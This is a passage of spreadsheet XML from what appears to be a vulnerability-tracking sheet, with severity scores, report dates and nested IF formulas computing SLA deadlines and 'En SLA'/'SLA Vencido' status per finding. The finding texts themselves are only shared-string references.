      <c r="AE333" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG333" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="334" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A334" s="50">
        <v>333</v>
      </c>
      <c r="B334" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C334" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D334" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G334" s="60" t="s">
        <v>2096</v>
      </c>
      <c r="H334" t="s">
        <v>3664</v>
      </c>
      <c r="I334" t="s">
        <v>3666</v>
      </c>
      <c r="J334" t="s">
        <v>3672</v>
      </c>
      <c r="L334" s="84" t="s">
        <v>655</v>
      </c>
      <c r="M334" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N334">
        <v>4.3</v>
      </c>
      <c r="Q334" t="s">
        <v>3668</v>
      </c>
      <c r="T334" s="1">
        <v>46134</v>
      </c>
      <c r="U334" s="55">
        <f t="shared" ca="1" si="55"/>
        <v>75</v>
      </c>
      <c r="V334" s="1">
        <f t="shared" si="56"/>
        <v>46224</v>
      </c>
      <c r="W334" s="56" t="str">
        <f t="shared" ca="1" si="57"/>
        <v>En SLA</v>
      </c>
      <c r="AB334" s="65" t="s">
        <v>3673</v>
      </c>
      <c r="AC334" s="65" t="s">
        <v>3675</v>
      </c>
      <c r="AD334" s="65" t="s">
        <v>3674</v>
      </c>
      <c r="AE334" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG334" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="335" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A335" s="50">
        <v>334</v>
      </c>
      <c r="B335" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C335" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D335" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G335" s="60" t="s">
        <v>3155</v>
      </c>
      <c r="I335" t="s">
        <v>3686</v>
      </c>
      <c r="J335" t="s">
        <v>80</v>
      </c>
      <c r="L335" s="84" t="s">
        <v>655</v>
      </c>
      <c r="M335" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N335">
        <v>5.3</v>
      </c>
      <c r="Q335" s="87" t="s">
        <v>3687</v>
      </c>
      <c r="T335" s="1">
        <v>46142</v>
      </c>
      <c r="U335" s="55">
        <f t="shared" ca="1" si="55"/>
        <v>67</v>
      </c>
      <c r="V335" s="1">
        <f t="shared" si="56"/>
        <v>46232</v>
      </c>
      <c r="W335" s="56" t="str">
        <f t="shared" ca="1" si="57"/>
        <v>En SLA</v>
      </c>
      <c r="AB335" s="65" t="s">
        <v>3689</v>
      </c>
      <c r="AC335" s="65" t="s">
        <v>1992</v>
      </c>
      <c r="AD335" s="65" t="s">
        <v>3688</v>
      </c>
      <c r="AE335" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG335" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="336" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A336" s="50">
        <v>335</v>
      </c>
      <c r="B336" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C336" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D336" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G336" s="60" t="s">
        <v>2886</v>
      </c>
      <c r="I336" t="s">
        <v>3728</v>
      </c>
      <c r="J336" s="65" t="s">
        <v>750</v>
      </c>
      <c r="L336" s="84" t="s">
        <v>655</v>
      </c>
      <c r="M336" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N336">
        <v>5.3</v>
      </c>
      <c r="Q336" s="87" t="s">
        <v>3735</v>
      </c>
      <c r="T336" s="1">
        <v>46149</v>
      </c>
      <c r="U336" s="55">
        <f t="shared" ca="1" si="55"/>
        <v>60</v>
      </c>
      <c r="V336" s="1">
        <f t="shared" si="56"/>
        <v>46239</v>
      </c>
      <c r="W336" s="56" t="str">
        <f t="shared" ca="1" si="57"/>
        <v>En SLA</v>
      </c>
      <c r="AB336" s="65" t="s">
        <v>3731</v>
      </c>
      <c r="AC336" s="65" t="s">
        <v>3733</v>
      </c>
      <c r="AD336" s="65" t="s">
        <v>3732</v>
      </c>
      <c r="AE336" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG336" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="337" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A337" s="50">
        <v>336</v>
      </c>
      <c r="B337" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C337" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D337" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G337" s="60" t="s">
        <v>2886</v>
      </c>
      <c r="I337" t="s">
        <v>3729</v>
      </c>
      <c r="J337" t="s">
        <v>1764</v>
      </c>
      <c r="L337" s="84" t="s">
        <v>655</v>
      </c>
      <c r="M337" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N337">
        <v>4.3</v>
      </c>
      <c r="Q337" s="91" t="s">
        <v>3734</v>
      </c>
      <c r="T337" s="1">
        <v>46149</v>
      </c>
      <c r="U337" s="55">
        <f t="shared" ref="U337:U338" ca="1" si="58">TODAY()-T337</f>
        <v>60</v>
      </c>
      <c r="V337" s="1">
        <f t="shared" ref="V337:V338" si="59">IF(M337="Critical",T337+10,IF(M337="High",T337+30,IF(M337="Bad",T337+30,IF(M337="Medium",T337+90,IF(M337="Warm",T337+90,IF(M337="Low",T337+120,IF(M337="Fair",T337+120,IF(M337="Neutral",T337+120,""))))))))</f>
        <v>46239</v>
      </c>
      <c r="W337" s="56" t="str">
        <f t="shared" ref="W337:W338" ca="1" si="60">IF(M337="Critical",IF(U337&gt;10,"SLA Vencido","En SLA"),IF(M337="High",IF(U337&gt;30,"SLA Vencido","En SLA"),IF(M337="Bad",IF(U337&gt;30,"SLA Vencido","En SLA"),IF(M337="Medium",IF(U337&gt;90,"SLA Vencido","En SLA"),IF(M337="Warm",IF(U337&gt;90,"SLA Vencido","En SLA"),IF(M337="Low",IF(U337&gt;120,"SLA Vencido","En SLA"),IF(M337="Fair",IF(U337&gt;120,"SLA Vencido","En SLA"),IF(M337="Neutral",IF(U337&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>En SLA</v>
      </c>
      <c r="AB337" s="65" t="s">
        <v>3736</v>
      </c>
      <c r="AC337" s="65" t="s">
        <v>3737</v>
      </c>
      <c r="AD337" s="65" t="s">
        <v>3738</v>
      </c>
      <c r="AE337" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG337" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="338" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A338" s="50">
        <v>337</v>
      </c>
      <c r="B338" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C338" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D338" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G338" s="60" t="s">
        <v>2886</v>
      </c>
      <c r="I338" t="s">
        <v>3730</v>
      </c>
      <c r="J338" t="s">
        <v>1764</v>
      </c>
      <c r="L338" s="84" t="s">
        <v>655</v>
      </c>
      <c r="M338" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N338">
        <v>4.3</v>
      </c>
      <c r="Q338" s="87" t="s">
        <v>3735</v>
      </c>
      <c r="T338" s="1">
        <v>46149</v>
      </c>
      <c r="U338" s="55">
        <f t="shared" ca="1" si="58"/>
        <v>60</v>
      </c>
      <c r="V338" s="1">
        <f t="shared" si="59"/>
        <v>46239</v>
      </c>
      <c r="W338" s="56" t="str">
        <f t="shared" ca="1" si="60"/>
        <v>En SLA</v>
      </c>
      <c r="AB338" s="65" t="s">
        <v>3736</v>
      </c>
      <c r="AC338" s="65" t="s">
        <v>3737</v>
      </c>
      <c r="AD338" s="65" t="s">
        <v>3738</v>
      </c>
      <c r="AE338" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG338" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="339" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A339" s="50">
        <v>338</v>
      </c>
      <c r="B339" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C339" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D339" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G339" s="60" t="s">
        <v>2886</v>
      </c>
      <c r="I339" t="s">
        <v>3739</v>
      </c>
      <c r="J339" t="s">
        <v>3741</v>
      </c>
      <c r="L339" s="84" t="s">
        <v>655</v>
      </c>
      <c r="M339" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N339">
        <v>3.1</v>
      </c>
      <c r="Q339" s="91" t="s">
        <v>3734</v>
      </c>
      <c r="T339" s="1">
        <v>46149</v>
      </c>
      <c r="U339" s="55">
        <f t="shared" ref="U339:U341" ca="1" si="61">TODAY()-T339</f>
        <v>60</v>
      </c>
      <c r="V339" s="1">
        <f t="shared" ref="V339:V341" si="62">IF(M339="Critical",T339+10,IF(M339="High",T339+30,IF(M339="Bad",T339+30,IF(M339="Medium",T339+90,IF(M339="Warm",T339+90,IF(M339="Low",T339+120,IF(M339="Fair",T339+120,IF(M339="Neutral",T339+120,""))))))))</f>
        <v>46269</v>
      </c>
      <c r="W339" s="56" t="str">
        <f t="shared" ref="W339:W341" ca="1" si="63">IF(M339="Critical",IF(U339&gt;10,"SLA Vencido","En SLA"),IF(M339="High",IF(U339&gt;30,"SLA Vencido","En SLA"),IF(M339="Bad",IF(U339&gt;30,"SLA Vencido","En SLA"),IF(M339="Medium",IF(U339&gt;90,"SLA Vencido","En SLA"),IF(M339="Warm",IF(U339&gt;90,"SLA Vencido","En SLA"),IF(M339="Low",IF(U339&gt;120,"SLA Vencido","En SLA"),IF(M339="Fair",IF(U339&gt;120,"SLA Vencido","En SLA"),IF(M339="Neutral",IF(U339&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>En SLA</v>
      </c>
      <c r="AB339" s="65" t="s">
        <v>3742</v>
      </c>
      <c r="AC339" s="65" t="s">
        <v>3743</v>
      </c>
      <c r="AD339" s="65" t="s">
        <v>3744</v>
      </c>
      <c r="AE339" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG339" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="340" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A340" s="50">
        <v>339</v>
      </c>
      <c r="B340" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C340" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D340" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G340" s="60" t="s">
        <v>2886</v>
      </c>
      <c r="I340" t="s">
        <v>3740</v>
      </c>
      <c r="J340" t="s">
        <v>3741</v>
      </c>
      <c r="L340" s="84" t="s">
        <v>655</v>
      </c>
      <c r="M340" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N340">
        <v>3.1</v>
      </c>
      <c r="Q340" s="87" t="s">
        <v>3735</v>
      </c>
      <c r="T340" s="1">
        <v>46149</v>
      </c>
      <c r="U340" s="55">
        <f t="shared" ca="1" si="61"/>
        <v>60</v>
      </c>
      <c r="V340" s="1">
        <f t="shared" si="62"/>
        <v>46269</v>
      </c>
      <c r="W340" s="56" t="str">
        <f t="shared" ca="1" si="63"/>
        <v>En SLA</v>
      </c>
      <c r="AB340" s="65" t="s">
        <v>3742</v>
      </c>
      <c r="AC340" s="65" t="s">
        <v>3743</v>
      </c>
      <c r="AD340" s="65" t="s">
        <v>3744</v>
      </c>
      <c r="AE340" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AF340" s="65"/>
      <c r="AG340" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="341" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A341" s="50">
        <v>340</v>
      </c>
      <c r="B341" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C341" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D341" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G341" s="60" t="s">
        <v>2239</v>
      </c>
      <c r="I341" t="s">
        <v>3745</v>
      </c>
      <c r="J341" s="65" t="s">
        <v>3754</v>
      </c>
      <c r="L341" s="84" t="s">
        <v>655</v>
      </c>
      <c r="M341" s="50" t="s">
        <v>42</v>
      </c>
      <c r="N341">
        <v>9.8000000000000007</v>
      </c>
      <c r="Q341" t="s">
        <v>3756</v>
      </c>
      <c r="T341" s="1">
        <v>46162</v>
      </c>
      <c r="U341" s="55">
        <f t="shared" ca="1" si="61"/>
        <v>47</v>
      </c>
      <c r="V341" s="1">
        <f t="shared" si="62"/>
        <v>46172</v>
      </c>
      <c r="W341" s="56" t="str">
        <f t="shared" ca="1" si="63"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB341" s="65" t="s">
        <v>3757</v>
      </c>
      <c r="AC341" s="65" t="s">
        <v>3759</v>
      </c>
      <c r="AD341" s="65" t="s">
        <v>3758</v>
      </c>
      <c r="AE341" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG341" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="342" spans="1:33" ht="159.5" x14ac:dyDescent="0.35">
      <c r="A342" s="50">
        <v>341</v>
      </c>
      <c r="B342" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C342" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D342" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G342" s="60" t="s">
        <v>2239</v>
      </c>
      <c r="I342" t="s">
        <v>3750</v>
      </c>
      <c r="J342" t="s">
        <v>3746</v>
      </c>
      <c r="L342" s="84" t="s">
        <v>655</v>
      </c>
      <c r="M342" s="50" t="s">
        <v>522</v>
      </c>
      <c r="N342">
        <v>8.6</v>
      </c>
      <c r="Q342" t="s">
        <v>2243</v>
      </c>
      <c r="T342" s="1">
        <v>46155</v>
      </c>
      <c r="U342" s="55">
        <f ca="1">TODAY()-T342</f>
        <v>54</v>
      </c>
      <c r="V342" s="1">
        <f>IF(M342="Critical",T342+10,IF(M342="High",T342+30,IF(M342="Bad",T342+30,IF(M342="Medium",T342+90,IF(M342="Warm",T342+90,IF(M342="Low",T342+120,IF(M342="Fair",T342+120,IF(M342="Neutral",T342+120,""))))))))</f>
        <v>46185</v>
      </c>
      <c r="W342" s="56" t="str">
        <f ca="1">IF(M342="Critical",IF(U342&gt;10,"SLA Vencido","En SLA"),IF(M342="High",IF(U342&gt;30,"SLA Vencido","En SLA"),IF(M342="Bad",IF(U342&gt;30,"SLA Vencido","En SLA"),IF(M342="Medium",IF(U342&gt;90,"SLA Vencido","En SLA"),IF(M342="Warm",IF(U342&gt;90,"SLA Vencido","En SLA"),IF(M342="Low",IF(U342&gt;120,"SLA Vencido","En SLA"),IF(M342="Fair",IF(U342&gt;120,"SLA Vencido","En SLA"),IF(M342="Neutral",IF(U342&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB342" s="65" t="s">
        <v>3747</v>
      </c>
      <c r="AC342" s="65" t="s">
        <v>3749</v>
      </c>
      <c r="AD342" s="65" t="s">
        <v>3748</v>
      </c>
      <c r="AE342" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG342" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="343" spans="1:33" ht="145" x14ac:dyDescent="0.35">
      <c r="A343" s="50">
        <v>342</v>
      </c>
      <c r="B343" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C343" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D343" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G343" s="60" t="s">
        <v>2239</v>
      </c>
      <c r="I343" t="s">
        <v>3751</v>
      </c>
      <c r="J343" t="s">
        <v>2926</v>
      </c>
      <c r="L343" s="84" t="s">
        <v>655</v>
      </c>
      <c r="M343" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N343">
        <v>6.2</v>
      </c>
      <c r="Q343" t="s">
        <v>3756</v>
      </c>
      <c r="T343" s="1">
        <v>46162</v>
      </c>
      <c r="U343" s="55">
        <f t="shared" ref="U343" ca="1" si="64">TODAY()-T343</f>
        <v>47</v>
      </c>
      <c r="V343" s="1">
        <f t="shared" ref="V343" si="65">IF(M343="Critical",T343+10,IF(M343="High",T343+30,IF(M343="Bad",T343+30,IF(M343="Medium",T343+90,IF(M343="Warm",T343+90,IF(M343="Low",T343+120,IF(M343="Fair",T343+120,IF(M343="Neutral",T343+120,""))))))))</f>
        <v>46252</v>
      </c>
      <c r="W343" s="56" t="str">
        <f t="shared" ref="W343" ca="1" si="66">IF(M343="Critical",IF(U343&gt;10,"SLA Vencido","En SLA"),IF(M343="High",IF(U343&gt;30,"SLA Vencido","En SLA"),IF(M343="Bad",IF(U343&gt;30,"SLA Vencido","En SLA"),IF(M343="Medium",IF(U343&gt;90,"SLA Vencido","En SLA"),IF(M343="Warm",IF(U343&gt;90,"SLA Vencido","En SLA"),IF(M343="Low",IF(U343&gt;120,"SLA Vencido","En SLA"),IF(M343="Fair",IF(U343&gt;120,"SLA Vencido","En SLA"),IF(M343="Neutral",IF(U343&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>En SLA</v>
      </c>
      <c r="AB343" s="65" t="s">
        <v>3760</v>
      </c>
      <c r="AC343" s="65" t="s">
        <v>3762</v>
      </c>
      <c r="AD343" s="65" t="s">
        <v>3761</v>
      </c>
      <c r="AE343" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG343" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="344" spans="1:33" ht="145" x14ac:dyDescent="0.35">
      <c r="A344" s="50">
        <v>343</v>
      </c>
      <c r="B344" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C344" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D344" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G344" s="60" t="s">
        <v>2239</v>
      </c>
      <c r="I344" t="s">
        <v>3752</v>
      </c>
      <c r="J344" t="s">
        <v>3755</v>
      </c>
      <c r="L344" s="84" t="s">
        <v>655</v>
      </c>
      <c r="M344" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N344">
        <v>5.3</v>
      </c>
      <c r="Q344" t="s">
        <v>3756</v>
      </c>
      <c r="T344" s="1">
        <v>46162</v>
      </c>
      <c r="U344" s="55">
        <f t="shared" ref="U344:U345" ca="1" si="67">TODAY()-T344</f>
        <v>47</v>
      </c>
      <c r="V344" s="1">
        <f t="shared" ref="V344:V345" si="68">IF(M344="Critical",T344+10,IF(M344="High",T344+30,IF(M344="Bad",T344+30,IF(M344="Medium",T344+90,IF(M344="Warm",T344+90,IF(M344="Low",T344+120,IF(M344="Fair",T344+120,IF(M344="Neutral",T344+120,""))))))))</f>
        <v>46252</v>
      </c>
      <c r="W344" s="56" t="str">
        <f t="shared" ref="W344:W345" ca="1" si="69">IF(M344="Critical",IF(U344&gt;10,"SLA Vencido","En SLA"),IF(M344="High",IF(U344&gt;30,"SLA Vencido","En SLA"),IF(M344="Bad",IF(U344&gt;30,"SLA Vencido","En SLA"),IF(M344="Medium",IF(U344&gt;90,"SLA Vencido","En SLA"),IF(M344="Warm",IF(U344&gt;90,"SLA Vencido","En SLA"),IF(M344="Low",IF(U344&gt;120,"SLA Vencido","En SLA"),IF(M344="Fair",IF(U344&gt;120,"SLA Vencido","En SLA"),IF(M344="Neutral",IF(U344&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>En SLA</v>
      </c>
      <c r="AB344" s="65" t="s">
        <v>3763</v>
      </c>
      <c r="AC344" s="65" t="s">
        <v>3765</v>
      </c>
      <c r="AD344" s="65" t="s">
        <v>3764</v>
      </c>
      <c r="AE344" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG344" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="345" spans="1:33" ht="246.5" x14ac:dyDescent="0.35">
      <c r="A345" s="50">
        <v>344</v>
      </c>
      <c r="B345" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C345" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D345" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G345" s="60" t="s">
        <v>2239</v>
      </c>
      <c r="I345" t="s">
        <v>3753</v>
      </c>
      <c r="J345" t="s">
        <v>2003</v>
      </c>
      <c r="L345" s="84" t="s">
        <v>655</v>
      </c>
      <c r="M345" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N345">
        <v>2.8</v>
      </c>
      <c r="Q345" t="s">
        <v>3756</v>
      </c>
      <c r="T345" s="1">
        <v>46162</v>
      </c>
      <c r="U345" s="55">
        <f t="shared" ca="1" si="67"/>
        <v>47</v>
      </c>
      <c r="V345" s="1">
        <f t="shared" si="68"/>
        <v>46282</v>
      </c>
      <c r="W345" s="56" t="str">
        <f t="shared" ca="1" si="69"/>
        <v>En SLA</v>
      </c>
      <c r="AB345" s="65" t="s">
        <v>3766</v>
      </c>
      <c r="AC345" s="65" t="s">
        <v>3768</v>
      </c>
      <c r="AD345" s="65" t="s">
        <v>3767</v>
      </c>
      <c r="AE345" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG345" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="346" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A346" s="50">
        <v>345</v>
      </c>
      <c r="B346" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C346" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D346" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G346" s="60" t="s">
        <v>2053</v>
      </c>
      <c r="I346" t="s">
        <v>3769</v>
      </c>
      <c r="J346" s="65" t="s">
        <v>3773</v>
      </c>
      <c r="L346" s="84" t="s">
        <v>655</v>
      </c>
      <c r="M346" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N346">
        <v>6.3</v>
      </c>
      <c r="Q346" t="s">
        <v>3777</v>
      </c>
      <c r="T346" s="1">
        <v>46162</v>
      </c>
      <c r="U346" s="55">
        <f t="shared" ref="U346:U349" ca="1" si="70">TODAY()-T346</f>
        <v>47</v>
      </c>
      <c r="V346" s="1">
        <f t="shared" ref="V346:V349" si="71">IF(M346="Critical",T346+10,IF(M346="High",T346+30,IF(M346="Bad",T346+30,IF(M346="Medium",T346+90,IF(M346="Warm",T346+90,IF(M346="Low",T346+120,IF(M346="Fair",T346+120,IF(M346="Neutral",T346+120,""))))))))</f>
        <v>46252</v>
      </c>
      <c r="W346" s="56" t="str">
        <f t="shared" ref="W346:W349" ca="1" si="72">IF(M346="Critical",IF(U346&gt;10,"SLA Vencido","En SLA"),IF(M346="High",IF(U346&gt;30,"SLA Vencido","En SLA"),IF(M346="Bad",IF(U346&gt;30,"SLA Vencido","En SLA"),IF(M346="Medium",IF(U346&gt;90,"SLA Vencido","En SLA"),IF(M346="Warm",IF(U346&gt;90,"SLA Vencido","En SLA"),IF(M346="Low",IF(U346&gt;120,"SLA Vencido","En SLA"),IF(M346="Fair",IF(U346&gt;120,"SLA Vencido","En SLA"),IF(M346="Neutral",IF(U346&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>En SLA</v>
      </c>
      <c r="AB346" s="65" t="s">
        <v>3776</v>
      </c>
      <c r="AC346" s="65" t="s">
        <v>3779</v>
      </c>
      <c r="AD346" s="65" t="s">
        <v>3778</v>
      </c>
      <c r="AE346" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG346" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="347" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A347" s="50">
        <v>346</v>
      </c>
      <c r="B347" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C347" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D347" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G347" s="60" t="s">
        <v>2053</v>
      </c>
      <c r="I347" t="s">
        <v>3770</v>
      </c>
      <c r="J347" s="65" t="s">
        <v>3774</v>
      </c>
      <c r="L347" s="84" t="s">
        <v>655</v>
      </c>
      <c r="M347" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q347" t="s">
        <v>3780</v>
      </c>
      <c r="T347" s="1">
        <v>46162</v>
      </c>
      <c r="U347" s="55">
        <f t="shared" ca="1" si="70"/>
        <v>47</v>
      </c>
      <c r="V347" s="1">
        <f t="shared" si="71"/>
        <v>46252</v>
      </c>
      <c r="W347" s="56" t="str">
        <f t="shared" ca="1" si="72"/>
        <v>En SLA</v>
      </c>
      <c r="AB347" s="65" t="s">
        <v>3781</v>
      </c>
      <c r="AC347" s="65" t="s">
        <v>3783</v>
      </c>
      <c r="AD347" s="65" t="s">
        <v>3782</v>
      </c>
      <c r="AE347" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG347" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="348" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A348" s="50">
        <v>347</v>
      </c>
      <c r="B348" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C348" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D348" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G348" s="60" t="s">
        <v>2053</v>
      </c>
      <c r="I348" t="s">
        <v>3771</v>
      </c>
      <c r="J348" s="65" t="s">
        <v>3775</v>
      </c>
      <c r="L348" s="84" t="s">
        <v>655</v>
      </c>
      <c r="M348" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q348" t="s">
        <v>3777</v>
      </c>
      <c r="T348" s="1">
        <v>46162</v>
      </c>
      <c r="U348" s="55">
        <f t="shared" ca="1" si="70"/>
        <v>47</v>
      </c>
      <c r="V348" s="1">
        <f t="shared" si="71"/>
        <v>46252</v>
      </c>
      <c r="W348" s="56" t="str">
        <f t="shared" ca="1" si="72"/>
        <v>En SLA</v>
      </c>
      <c r="AB348" s="65" t="s">
        <v>3784</v>
      </c>
      <c r="AC348" s="65" t="s">
        <v>3786</v>
      </c>
      <c r="AD348" s="65" t="s">
        <v>3785</v>
      </c>
      <c r="AE348" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG348" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="349" spans="1:33" ht="203" x14ac:dyDescent="0.35">
      <c r="A349" s="50">
        <v>348</v>
      </c>
      <c r="B349" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C349" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D349" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G349" s="60" t="s">
        <v>2053</v>
      </c>
      <c r="I349" t="s">
        <v>3772</v>
      </c>
      <c r="J349" s="65" t="s">
        <v>3600</v>
      </c>
      <c r="L349" s="84" t="s">
        <v>655</v>
      </c>
      <c r="M349" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q349" t="s">
        <v>3777</v>
      </c>
      <c r="T349" s="1">
        <v>46162</v>
      </c>
      <c r="U349" s="55">
        <f t="shared" ca="1" si="70"/>
        <v>47</v>
      </c>
      <c r="V349" s="1">
        <f t="shared" si="71"/>
        <v>46252</v>
      </c>
      <c r="W349" s="56" t="str">
        <f t="shared" ca="1" si="72"/>
        <v>En SLA</v>
      </c>
      <c r="AB349" s="65" t="s">
        <v>3787</v>
      </c>
      <c r="AC349" s="65" t="s">
        <v>3789</v>
      </c>
      <c r="AD349" s="65" t="s">
        <v>3788</v>
      </c>
      <c r="AE349" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG349" s="53" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="350" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A350" s="50">
        <v>345</v>
      </c>
      <c r="B350" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C350" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D350" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G350" s="60" t="s">
        <v>2045</v>
      </c>
      <c r="I350" t="s">
        <v>3791</v>
      </c>
      <c r="J350" t="s">
        <v>3790</v>
      </c>
      <c r="L350" s="84" t="s">
        <v>655</v>
      </c>
      <c r="M350" s="50" t="s">
        <v>522</v>
      </c>
      <c r="N350">
        <v>7.5</v>
      </c>
      <c r="Q350" t="s">
        <v>2099</v>
      </c>
      <c r="T350" s="1">
        <v>46151</v>
      </c>
      <c r="U350" s="55">
        <f t="shared" ref="U350:U351" ca="1" si="73">TODAY()-T350</f>
        <v>58</v>
      </c>
      <c r="V350" s="1">
        <f t="shared" ref="V350:V351" si="74">IF(M350="Critical",T350+10,IF(M350="High",T350+30,IF(M350="Bad",T350+30,IF(M350="Medium",T350+90,IF(M350="Warm",T350+90,IF(M350="Low",T350+120,IF(M350="Fair",T350+120,IF(M350="Neutral",T350+120,""))))))))</f>
        <v>46181</v>
      </c>
      <c r="W350" s="56" t="str">
        <f t="shared" ref="W350:W351" ca="1" si="75">IF(M350="Critical",IF(U350&gt;10,"SLA Vencido","En SLA"),IF(M350="High",IF(U350&gt;30,"SLA Vencido","En SLA"),IF(M350="Bad",IF(U350&gt;30,"SLA Vencido","En SLA"),IF(M350="Medium",IF(U350&gt;90,"SLA Vencido","En SLA"),IF(M350="Warm",IF(U350&gt;90,"SLA Vencido","En SLA"),IF(M350="Low",IF(U350&gt;120,"SLA Vencido","En SLA"),IF(M350="Fair",IF(U350&gt;120,"SLA Vencido","En SLA"),IF(M350="Neutral",IF(U350&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
